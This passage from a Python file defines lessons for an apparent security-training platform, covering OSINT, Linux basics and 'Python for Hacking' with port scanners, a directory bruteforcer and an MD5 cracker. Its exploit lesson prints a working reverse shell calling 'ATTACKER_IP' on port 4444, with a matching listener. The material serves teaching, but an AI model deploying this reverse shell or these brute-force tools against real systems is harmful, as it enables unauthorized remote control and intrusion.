                "content": """
                    <h3>Username Search</h3>
                    <pre><code># Sherlock - Find usernames across platforms
python3 sherlock username

# Namechk.com (manual)
# KnowEm.com (manual)</code></pre>
                    
                    <h3>Email Investigation</h3>
                    <pre><code># Hunter.io - Find emails
# Phonebook.cz - Email search
# Have I Been Pwned - Breach check

# theHarvester
theHarvester -d company.com -b all</code></pre>
                    
                    <h3>Reverse Image Search</h3>
                    <ul>
                        <li>Google Images (drag & drop)</li>
                        <li>TinEye.com</li>
                        <li>Yandex.com/images</li>
                        <li>PimEyes (faces)</li>
                    </ul>
                    
                    <h3>Social Media</h3>
                    <pre><code># Check archived versions
Wayback Machine (archive.org)

# Twitter/X Advanced Search
from:username since:2024-01-01

# Facebook Graph Search (limited)
# LinkedIn (company research)</code></pre>
                """
            },
            {
                "id": "osint-domain",
                "title": "Domain & IP Research",
                "duration": "25 min",
                "topics": [
                    "WHOIS Lookup",
                    "DNS Records",
                    "Historical Data",
                    "IP Geolocation"
                ],
                "content": """
                    <h3>WHOIS & Registration</h3>
                    <pre><code># WHOIS lookup
whois target.com

# Check registration history
who.is
domaintools.com</code></pre>
                    
                    <h3>DNS Records</h3>
                    <pre><code># DNS enumeration
dig target.com ANY
nslookup -type=any target.com

# DNS history
securitytrails.com
dnshistory.org</code></pre>
                    
                    <h3>IP Research</h3>
                    <pre><code># IP geolocation
ipinfo.io/8.8.8.8
iplocation.net

# Shodan - Device search
shodan search hostname:target.com

# Censys - Certificate search
censys.io</code></pre>
                    
                    <h3>Website Archives</h3>
                    <pre><code># Wayback Machine
web.archive.org/web/*/target.com

# CachedView
cachedview.com</code></pre>
                """
            }
        ]
    },
    "linux": {
        "id": "linux",
        "title": "🐧 Linux Mastery",
        "description": "Complete Linux training from absolute beginner to advanced sysadmin",
        "icon": "🖥️",
        "color": "#FFC107",
        "lessons": [
            {
                "id": "linux-basics",
                "title": "Linux Fundamentals",
                "duration": "30 min",
                "topics": [
                    "What is Linux?",
                    "Linux Distributions",
                    "The Terminal",
                    "Basic Navigation"
                ],
                "content": """
                    <h3>What is Linux?</h3>
                    <p>Linux is a free, open-source operating system kernel. It powers everything from smartphones (Android) to servers, supercomputers, and hacking tools.</p>
                    
                    <h3>Popular Distributions</h3>
                    <ul>
                        <li><strong>Kali Linux:</strong> For penetration testing</li>
                        <li><strong>Ubuntu:</strong> User-friendly, great for beginners</li>
                        <li><strong>Debian:</strong> Stable, server-focused</li>
                        <li><strong>Arch Linux:</strong> Advanced, highly customizable</li>
                        <li><strong>Parrot OS:</strong> Security and privacy focused</li>
                    </ul>
                    
                    <h3>Basic Terminal Commands</h3>
                    <pre><code># Print working directory
pwd

# List files
ls
ls -la  # Show all files with details

# Change directory
cd /home
cd ..   # Go up one level
cd ~    # Go to home directory

# Create directory
mkdir newfolder

# Create file
touch newfile.txt

# View file content
cat file.txt
less file.txt  # Scrollable view

# Clear terminal
clear</code></pre>
                """
            },
            {
                "id": "linux-filesystem",
                "title": "File System & Navigation",
                "duration": "35 min",
                "topics": [
                    "Linux Directory Structure",
                    "File Operations",
                    "Finding Files",
                    "File Types"
                ],
                "content": """
                    <h3>Linux Directory Structure</h3>
                    <pre><code>/           # Root directory
├── bin     # Essential binaries (ls, cat, etc.)
├── boot    # Boot loader files
├── dev     # Device files
├── etc     # System configuration files
├── home    # User home directories
├── lib     # Shared libraries
├── opt     # Optional software
├── proc    # Process information
├── root    # Root user's home
├── tmp     # Temporary files
├── usr     # User programs
├── var     # Variable data (logs, etc.)
└── sbin    # System binaries</code></pre>
                    
                    <h3>File Operations</h3>
                    <pre><code># Copy files
cp source.txt destination.txt
cp -r folder/ newfolder/  # Copy directory

# Move/Rename files
mv oldname.txt newname.txt
mv file.txt /new/location/

# Delete files
rm file.txt
rm -r folder/    # Delete directory
rm -rf folder/   # Force delete (careful!)

# View file info
file document.pdf
stat file.txt</code></pre>
                    
                    <h3>Finding Files</h3>
                    <pre><code># Find by name
find / -name "filename.txt"
find /home -name "*.txt"

# Find by type
find / -type f -name "*.log"  # Files
find / -type d -name "config" # Directories

# Find by size
find / -size +100M  # Files larger than 100MB

# Locate (faster, uses database)
locate filename
updatedb  # Update locate database</code></pre>
                """
            },
            {
                "id": "linux-permissions",
                "title": "Users & Permissions",
                "duration": "40 min",
                "topics": [
                    "User Management",
                    "File Permissions",
                    "Ownership",
                    "Special Permissions"
                ],
                "content": """
                    <h3>Understanding Permissions</h3>
                    <pre><code># Permission format: -rwxrwxrwx
# Position 1:   File type (- = file, d = directory)
# Positions 2-4: Owner permissions (rwx)
# Positions 5-7: Group permissions (rwx)
# Positions 8-10: Others permissions (rwx)

# r = read (4)
# w = write (2)
# x = execute (1)

# Examples:
-rw-r--r--  # Owner: rw, Group: r, Others: r (644)
-rwxr-xr-x  # Owner: rwx, Group: rx, Others: rx (755)
drwx------  # Directory, Owner only (700)</code></pre>
                    
                    <h3>Changing Permissions</h3>
                    <pre><code># Numeric method
chmod 755 script.sh    # rwxr-xr-x
chmod 644 file.txt     # rw-r--r--
chmod 600 secret.txt   # rw-------

# Symbolic method
chmod +x script.sh     # Add execute
chmod -w file.txt      # Remove write
chmod u+x,g+r file.sh  # User +x, Group +r

# Recursive
chmod -R 755 folder/</code></pre>
                    
                    <h3>Ownership</h3>
                    <pre><code># Change owner
chown user file.txt
chown user:group file.txt
chown -R user:group folder/

# View current user
whoami
id</code></pre>
                    
                    <h3>Special Permissions</h3>
                    <pre><code># SUID (4) - Run as file owner
chmod 4755 program
chmod u+s program

# SGID (2) - Run as group owner
chmod 2755 folder
chmod g+s folder

# Sticky Bit (1) - Only owner can delete
chmod 1777 /tmp
chmod +t folder

# Find SUID files (security check!)
find / -perm -4000 2>/dev/null</code></pre>
                """
            },
            {
                "id": "linux-text",
                "title": "Text Processing",
                "duration": "35 min",
                "topics": [
                    "Viewing Files",
                    "Text Editors",
                    "grep & regex",
                    "sed & awk"
                ],
                "content": """
                    <h3>Viewing Files</h3>
                    <pre><code># View entire file
cat file.txt

# View with line numbers
cat -n file.txt

# View first/last lines
head file.txt      # First 10 lines
head -20 file.txt  # First 20 lines
tail file.txt      # Last 10 lines
tail -f log.txt    # Follow file (live)

# Page through file
less file.txt
# Use: j/k to scroll, q to quit, / to search</code></pre>
                    
                    <h3>Text Editors</h3>
                    <pre><code># Nano (beginner-friendly)
nano file.txt
# Ctrl+O to save, Ctrl+X to exit

# Vim (powerful)
vim file.txt
# i = insert mode
# Esc = command mode
# :w = save
# :q = quit
# :wq = save and quit
# :q! = quit without saving</code></pre>
                    
                    <h3>grep - Pattern Search</h3>
                    <pre><code># Basic search
grep "pattern" file.txt

# Case insensitive
grep -i "pattern" file.txt

# Recursive search
grep -r "password" /etc/

# Show line numbers
grep -n "error" log.txt

# Invert match (exclude)
grep -v "comment" file.txt

# Regular expressions
grep -E "^[0-9]+" file.txt</code></pre>
                    
                    <h3>sed & awk</h3>
                    <pre><code># sed - Stream editor
sed 's/old/new/' file.txt           # Replace first
sed 's/old/new/g' file.txt          # Replace all
sed -i 's/old/new/g' file.txt       # In-place edit
sed '5d' file.txt                   # Delete line 5

# awk - Pattern processing
awk '{print $1}' file.txt           # Print first column
awk -F: '{print $1}' /etc/passwd    # Custom delimiter
awk '/pattern/ {print}' file.txt   # Print matching lines</code></pre>
                """
            },
            {
                "id": "linux-shell",
                "title": "Shell Scripting",
                "duration": "45 min",
                "topics": [
                    "Script Basics",
                    "Variables & Input",
                    "Conditionals & Loops",
                    "Functions"
                ],
                "content": """
                    <h3>Creating a Script</h3>
                    <pre><code>#!/bin/bash
# This is a comment

echo "Hello, World!"

# Make executable
chmod +x script.sh

# Run
./script.sh</code></pre>
                    
                    <h3>Variables</h3>
                    <pre><code>#!/bin/bash
# Variables
name="Hacker"
echo "Hello, $name"

# User input
read -p "Enter your name: " username
echo "Welcome, $username"

# Command substitution
current_date=$(date)
echo "Today is: $current_date"

# Special variables
echo "Script name: $0"
echo "First arg: $1"
echo "All args: $@"
echo "Number of args: $#"</code></pre>
                    
                    <h3>Conditionals</h3>
                    <pre><code>#!/bin/bash
# If statement
if [ $1 -gt 100 ]; then
    echo "Greater than 100"
elif [ $1 -eq 100 ]; then
    echo "Equal to 100"
else
    echo "Less than 100"
fi

# File tests
if [ -f /etc/passwd ]; then
    echo "File exists"
fi

# String comparison
if [ "$name" == "admin" ]; then
    echo "Welcome admin"
fi</code></pre>
                    
                    <h3>Loops</h3>
                    <pre><code>#!/bin/bash
# For loop
for i in 1 2 3 4 5; do
    echo "Number: $i"
done

# For loop with range
for i in {1..10}; do
    echo $i
done

# While loop
count=0
while [ $count -lt 5 ]; do
    echo "Count: $count"
    ((count++))
done

# Loop through files
for file in *.txt; do
    echo "Processing: $file"
done</code></pre>
                """
            },
            {
                "id": "linux-network",
                "title": "Networking",
                "duration": "40 min",
                "topics": [
                    "Network Interfaces",
                    "Connectivity Testing",
                    "Network Tools",
                    "Firewall Basics"
                ],
                "content": """
                    <h3>Network Interfaces</h3>
                    <pre><code># View IP addresses
ip addr
ip a

# Legacy command
ifconfig

# View routing table
ip route
route -n

# View DNS
cat /etc/resolv.conf</code></pre>
                    
                    <h3>Connectivity Testing</h3>
                    <pre><code># Ping
ping -c 4 google.com

# Traceroute
traceroute google.com

# DNS lookup
nslookup google.com
dig google.com
host google.com</code></pre>
                    
                    <h3>Network Tools</h3>
                    <pre><code># View open ports/connections
netstat -tulpn
ss -tulpn

# Check specific port
nc -zv host 80

# Download files
wget https://example.com/file.zip
curl -O https://example.com/file.zip

# SSH
ssh user@hostname
ssh -p 2222 user@host  # Custom port
ssh -i key.pem user@host  # With key

# SCP - Copy files over SSH
scp file.txt user@host:/path/
scp user@host:/path/file.txt .</code></pre>
                    
                    <h3>Firewall (iptables/ufw)</h3>
                    <pre><code># UFW (easier)
ufw status
ufw enable
ufw allow 22
ufw allow 80/tcp
ufw deny 23

# iptables
iptables -L -n
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -j DROP</code></pre>
                """
            },
            {
                "id": "linux-process",
                "title": "Process Management",
                "duration": "30 min",
                "topics": [
                    "Viewing Processes",
                    "Background Jobs",
                    "Killing Processes",
                    "System Resources"
                ],
                "content": """
                    <h3>Viewing Processes</h3>
                    <pre><code># List processes
ps aux
ps -ef

# Interactive process viewer
top
htop  # Better, if installed

# Find specific process
ps aux | grep nginx
pgrep nginx</code></pre>
                    
                    <h3>Background Jobs</h3>
                    <pre><code># Run in background
command &

# View background jobs
jobs

# Bring to foreground
fg %1

# Send to background
Ctrl+Z  # Pause
bg      # Continue in background

# Keep running after logout
nohup command &
nohup command > output.log 2>&1 &</code></pre>
                    
                    <h3>Killing Processes</h3>
                    <pre><code># Kill by PID
kill 1234
kill -9 1234  # Force kill

# Kill by name
killall nginx
pkill nginx

# Signal types
kill -SIGTERM 1234  # Graceful (15)
kill -SIGKILL 1234  # Force (9)
kill -SIGHUP 1234   # Reload config (1)</code></pre>
                    
                    <h3>System Resources</h3>
                    <pre><code># Memory usage
free -h

# Disk usage
df -h
du -sh folder/

# System info
uname -a
hostnamectl

# Uptime
uptime</code></pre>
                """
            },
            {
                "id": "linux-security",
                "title": "Security & Hardening",
                "duration": "45 min",
                "topics": [
                    "User Security",
                    "SSH Hardening",
                    "Service Management",
                    "Log Analysis"
                ],
                "content": """
                    <h3>User Security</h3>
                    <pre><code># Add user
useradd -m username
passwd username

# Add to sudo group
usermod -aG sudo username

# Lock/unlock user
passwd -l username
passwd -u username

# Check sudo access
sudo -l

# View login history
last
lastlog</code></pre>
                    
                    <h3>SSH Hardening</h3>
                    <pre><code># Edit: /etc/ssh/sshd_config

# Disable root login
PermitRootLogin no

# Use key-based auth only
PasswordAuthentication no
PubkeyAuthentication yes

# Change default port
Port 2222

# Limit users
AllowUsers admin deployer

# Restart SSH
systemctl restart sshd</code></pre>
                    
                    <h3>Service Management (systemd)</h3>
                    <pre><code># View service status
systemctl status nginx

# Start/stop services
systemctl start nginx
systemctl stop nginx
systemctl restart nginx

# Enable at boot
systemctl enable nginx
systemctl disable nginx

# View all services
systemctl list-units --type=service</code></pre>
                    
                    <h3>Log Analysis</h3>
                    <pre><code># Important log files
/var/log/syslog      # System logs
/var/log/auth.log    # Authentication
/var/log/apache2/    # Web server
/var/log/messages    # General

# View logs
tail -f /var/log/syslog
journalctl -xe
journalctl -u nginx

# Find failed logins
grep "Failed" /var/log/auth.log
cat /var/log/auth.log | grep "Failed password"</code></pre>
                """
            }
        ]
    },
    "python": {
        "id": "python",
        "title": "🐍 Python for Hacking",
        "description": "Learn Python programming for security tools and exploit development",
        "icon": "💻",
        "color": "#3776AB",
        "lessons": [
            {
                "id": "py-basics",
                "title": "Python Basics",
                "duration": "35 min",
                "topics": [
                    "Variables & Data Types",
                    "Control Flow",
                    "Functions",
                    "File Handling"
                ],
                "content": """
                    <h3>Why Python for Hacking?</h3>
                    <p>Python is the most popular language in cybersecurity because it's easy to learn, has powerful libraries, and can automate almost anything.</p>
                    
                    <h3>Variables & Data Types</h3>
                    <pre><code># Variables
name = "Hacker"
port = 80
is_open = True
targets = ["10.0.0.1", "10.0.0.2"]

# String operations
print(name.upper())
print(f"Scanning port {port}")

# Lists
targets.append("10.0.0.3")
for ip in targets:
    print(ip)</code></pre>
                    
                    <h3>Control Flow</h3>
                    <pre><code># If statements
port = 22
if port == 22:
    print("SSH detected")
elif port == 80:
    print("HTTP detected")
else:
    print("Unknown service")

# Loops
for i in range(1, 255):
    print(f"Scanning 192.168.1.{i}")

# While loop
attempts = 0
while attempts < 5:
    print(f"Attempt {attempts}")
    attempts += 1</code></pre>
                    
                    <h3>Functions</h3>
                    <pre><code>def scan_port(ip, port):
    \"\"\"Check if a port is open\"\"\"
    # Scanning logic here
    return True

# Call the function
result = scan_port("10.0.0.1", 80)
print(result)</code></pre>
                """
            },
            {
                "id": "py-network",
                "title": "Network Programming",
                "duration": "40 min",
                "topics": [
                    "Sockets",
                    "Port Scanner",
                    "Banner Grabbing",
                    "HTTP Requests"
                ],
                "content": """
                    <h3>Socket Programming</h3>
                    <pre><code>import socket

# Create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)

# Connect to a port
try:
    s.connect(("target.com", 80))
    print("Port 80 is OPEN")
except:
    print("Port 80 is CLOSED")
finally:
    s.close()</code></pre>
                    
                    <h3>Simple Port Scanner</h3>
                    <pre><code>import socket

def port_scan(target, ports):
    print(f"Scanning {target}...")
    open_ports = []
    
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
            print(f"[+] Port {port} is OPEN")
        sock.close()
    
    return open_ports

# Scan common ports
target = "scanme.nmap.org"
ports = [21, 22, 23, 80, 443, 8080]
port_scan(target, ports)</code></pre>
                    
                    <h3>HTTP Requests with requests</h3>
                    <pre><code>import requests

# GET request
response = requests.get("https://httpbin.org/get")
print(response.status_code)
print(response.text)

# POST request with data
data = {"username": "admin", "password": "test"}
response = requests.post("https://httpbin.org/post", data=data)

# With headers
headers = {"User-Agent": "Mozilla/5.0"}
response = requests.get(url, headers=headers)</code></pre>
                """
            },
            {
                "id": "py-web",
                "title": "Web Scraping & Automation",
                "duration": "35 min",
                "topics": [
                    "BeautifulSoup",
                    "Directory Bruteforcing",
                    "Form Automation",
                    "Subdomain Finder"
                ],
                "content": """
                    <h3>Web Scraping with BeautifulSoup</h3>
                    <pre><code>import requests
from bs4 import BeautifulSoup

response = requests.get("https://example.com")
soup = BeautifulSoup(response.text, 'html.parser')

# Find elements
title = soup.title.text
links = soup.find_all('a')

for link in links:
    href = link.get('href')
    print(href)</code></pre>
                    
                    <h3>Directory Bruteforcer</h3>
                    <pre><code>import requests

def dir_brute(url, wordlist):
    with open(wordlist, 'r') as f:
        for line in f:
            dir_name = line.strip()
            test_url = f"{url}/{dir_name}"
            
            response = requests.get(test_url)
            if response.status_code == 200:
                print(f"[+] Found: {test_url}")
            elif response.status_code == 403:
                print(f"[!] Forbidden: {test_url}")

# Usage
dir_brute("https://target.com", "wordlist.txt")</code></pre>
                    
                    <h3>Subdomain Finder</h3>
                    <pre><code>import requests

def find_subdomains(domain, wordlist):
    found = []
    with open(wordlist, 'r') as f:
        for line in f:
            subdomain = line.strip()
            url = f"http://{subdomain}.{domain}"
            
            try:
                response = requests.get(url, timeout=2)
                print(f"[+] Found: {url}")
                found.append(url)
            except:
                pass
    
    return found

# Usage
find_subdomains("target.com", "subdomains.txt")</code></pre>
                """
            },
            {
                "id": "py-crypto",
                "title": "Cryptography",
                "duration": "30 min",
                "topics": [
                    "Hashing",
                    "Encoding/Decoding",
                    "Password Cracking",
                    "Encryption"
                ],
                "content": """
                    <h3>Hashing</h3>
                    <pre><code>import hashlib

# MD5 hash
text = "password123"
md5_hash = hashlib.md5(text.encode()).hexdigest()
print(f"MD5: {md5_hash}")

# SHA256 hash
sha256_hash = hashlib.sha256(text.encode()).hexdigest()
print(f"SHA256: {sha256_hash}")

# SHA1 hash
sha1_hash = hashlib.sha1(text.encode()).hexdigest()
print(f"SHA1: {sha1_hash}")</code></pre>
                    
                    <h3>Base64 Encoding</h3>
                    <pre><code>import base64

# Encode
text = "secret message"
encoded = base64.b64encode(text.encode())
print(f"Encoded: {encoded}")

# Decode
decoded = base64.b64decode(encoded).decode()
print(f"Decoded: {decoded}")</code></pre>
                    
                    <h3>Simple Password Cracker</h3>
                    <pre><code>import hashlib

def crack_md5(hash_to_crack, wordlist):
    with open(wordlist, 'r') as f:
        for line in f:
            password = line.strip()
            test_hash = hashlib.md5(password.encode()).hexdigest()
            
            if test_hash == hash_to_crack:
                print(f"[+] Password found: {password}")
                return password
    
    print("[-] Password not found")
    return None

# Crack this hash
target = "5f4dcc3b5aa765d61d8327deb882cf99"  # password
crack_md5(target, "passwords.txt")</code></pre>
                """
            },
            {
                "id": "py-automate",
                "title": "Security Automation",
                "duration": "40 min",
                "topics": [
                    "Nmap Automation",
                    "Log Analysis",
                    "Report Generation",
                    "Multi-threading"
                ],
                "content": """
                    <h3>Nmap with Python</h3>
                    <pre><code>import nmap

# Create scanner
nm = nmap.PortScanner()

# Scan target
target = "scanme.nmap.org"
nm.scan(target, '22-443')

# Get results
for host in nm.all_hosts():
    print(f"Host: {host}")
    for port in nm[host]['tcp']:
        state = nm[host]['tcp'][port]['state']
        print(f"  Port {port}: {state}")</code></pre>
                    
                    <h3>Log Analysis Script</h3>
                    <pre><code>import re

def analyze_auth_log(logfile):
    failed_attempts = {}
    
    with open(logfile, 'r') as f:
        for line in f:
            if "Failed password" in line:
                # Extract IP address
                ip = re.search(r'\\d+\\.\\d+\\.\\d+\\.\\d+', line)
                if ip:
                    ip = ip.group()
                    failed_attempts[ip] = failed_attempts.get(ip, 0) + 1
    
    # Print attackers
    for ip, count in sorted(failed_attempts.items(), 
                           key=lambda x: x[1], reverse=True):
        print(f"{ip}: {count} failed attempts")

analyze_auth_log("/var/log/auth.log")</code></pre>
                    
                    <h3>Multi-threaded Scanner</h3>
                    <pre><code>import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(target, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((target, port))
    sock.close()
    if result == 0:
        print(f"[+] Port {port} is OPEN")
        return port
    return None

def fast_scan(target, ports):
    with ThreadPoolExecutor(max_workers=100) as executor:
        results = executor.map(lambda p: scan_port(target, p), ports)
    return [r for r in results if r]

# Scan 1000 ports quickly
ports = range(1, 1001)
fast_scan("target.com", ports)</code></pre>
                """
            },
            {
                "id": "py-exploit",
                "title": "Exploit Development",
                "duration": "45 min",
                "topics": [
                    "Reverse Shells",
                    "Payload Generation",
                    "Buffer Overflow Basics",
                    "Pwntools"
                ],
                "content": """
                    <h3>Simple Reverse Shell</h3>
                    <pre><code>import socket
import subprocess
import os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        
        output = subprocess.getoutput(command)
        s.send(output.encode())
    
    s.close()

# Connect back to attacker
# reverse_shell("ATTACKER_IP", 4444)</code></pre>
                    
                    <h3>Listener Script</h3>
                    <pre><code>import socket

def listener(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    
    print(f"[*] Listening on port {port}...")
    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")
    
    while True:
        command = input("Shell> ")
        if command.lower() == "exit":
            conn.send(b"exit")
            break
        
        conn.send(command.encode())
        response = conn.recv(4096).decode()
        print(response)
    
    conn.close()

# listener(4444)</code></pre>
                    
                    <h3>Pwntools for CTF</h3>
                    <pre><code>from pwn import *

# Connect to service
conn = remote("challenge.ctf.com", 1337)

# Receive until prompt
data = conn.recvuntil(b":")
print(data)

# Send payload
conn.sendline(b"A" * 100)

# Interactive mode
conn.interactive()</code></pre>
                    
                    <h3>Important Note</h3>
                    <p style="color: #ff6b6b;">⚠️ Only use these techniques on systems you own or have explicit permission to test. Unauthorized access is illegal.</p>
                """
            }
        ]
    }
}

def get_all_modules():
    """Get all learning modules"""
    return LEARNING_MODULES

def get_module_by_id(module_id):
    """Get a specific module by ID"""
    return LEARNING_MODULES.get(module_id)

def get_lesson_by_id(module_id, lesson_id):
    """Get a specific lesson"""
    module = LEARNING_MODULES.get(module_id)
    if module:
        for lesson in module['lessons']:
            if lesson['id'] == lesson_id:
                return lesson
    return None

def get_total_lessons():
    """Get total number of lessons"""
    total = 0
    for module in LEARNING_MODULES.values():
        total += len(module['lessons'])
    return total
